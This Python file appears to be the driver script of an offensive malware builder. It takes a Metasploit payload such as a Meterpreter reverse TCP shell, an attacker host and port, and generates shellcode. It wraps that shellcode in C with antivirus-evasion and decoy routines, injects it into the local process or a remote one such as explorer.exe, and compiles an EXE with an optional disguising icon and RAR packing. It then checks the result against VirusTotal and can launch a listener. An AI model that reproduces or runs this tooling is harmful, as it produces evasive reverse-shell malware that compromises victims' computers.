from lib import body, compiler, compression, core, decoy, evasion, gen, metascript
import argparse
import os

TYPE = ""
ARCHITECTURE = ""
PAYLOAD = ""
LHOST = ""
LPORT = ""
FILENAME = ""
SHELLCODE = ""
FINAL_CODE = ""
PROCESSNAME = ""
ICON = ""

if __name__ == '__main__':

    # Print banner
    core.BANNER()

    # Parse arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("type", help="Choose payload type", choices=["staged", "stageless"])
    parser.add_argument("architecture", help="Choose payload architecture", choices=["x86", "x64"])
    parser.add_argument("payload", help="Choose the metasploit payload (exemple: windows/x64/meterpreter/reverse_tcp)")
    parser.add_argument("lhost", help="Set your lhost (exemple: 192.168.1.60)")
    parser.add_argument("lport", help="Set your lport (exemple: 4444)")
    parser.add_argument("filename", help="Choose the name of the output file (exemple: Malware)")
    parser.add_argument("injectionType", help="Set injection method", choices=["local", "remote"])
    parser.add_argument("--procname", help="Choose process to inject shellcode for remote injection method (default/exemple: explorer.exe")
    parser.add_argument("--decoy", help="Number of decoys to add (unlimited)  -  PS : 1 decoy = 1 secondes to sleep.")
    parser.add_argument("--icon", help="Add your ICON to EXE file (exemple: my_icon_name.ico)")
    parser.add_argument("--compress", help="Compress EXE file to RAR)", action='store_true')
    parser.add_argument("--mscript", help="Run pre-configured MsfConsole", action='store_true')
    args = parser.parse_args()

    # Check that required directories and path are available, if not create them
    if not os.path.isdir("./output"):
        os.makedirs("./output")

    # Staged or no
    if args.type == "staged":
        TYPE += "YES"

    else:
        TYPE += "NO"

    # Which architecture
    if args.architecture == "x86":
        ARCHITECTURE += "x86"

    else:
        ARCHITECTURE += "x64"

    # Add payload
    PAYLOAD += str(args.payload)

    # Add lhost
    LHOST += str(args.lhost)

    # Add lport
    LPORT += str(args.lport)

    # Add filename
    FILENAME += "output/" + str(args.filename) + ".exe"

    # Generate shellcode
    SHELLCODE += gen.SHELLCODE_GENERATION(ARCHITECTURE, PAYLOAD, LHOST, LPORT)

    # Add processname
    if args.procname:
        PROCESSNAME += str(args.procname)

    # Generate C code
    FINAL_CODE += body.MODEL()
    FINAL_CODE += evasion.THE_GREAT_EVASION(FILENAME, ARCHITECTURE)
    if args.decoy:
        FINAL_CODE += decoy.FAKE_U(str(args.decoy))
    FINAL_CODE += str(SHELLCODE)
    FINAL_CODE += body.LOCAL_OR_REMOTE(args.injectionType, PROCESSNAME, SHELLCODE)

    with open('source.c', 'w') as f:
        f.write(FINAL_CODE)

    # Add ICON
    if args.icon:
        ICON += str(args.icon)

    # Autocompilation
    compiler.AUTO_COMPILE(FILENAME, ARCHITECTURE, ICON)

    # Compress EXE file to RAR file
    if args.compress:
        compression.RAR(FILENAME)

    core.VIRUSTOTAL()

    # Run pre-configured MsfConsole
    if args.mscript:
        metascript.RUN_METERPRETER_SCRIPT(ARCHITECTURE, TYPE, PAYLOAD, LHOST, LPORT)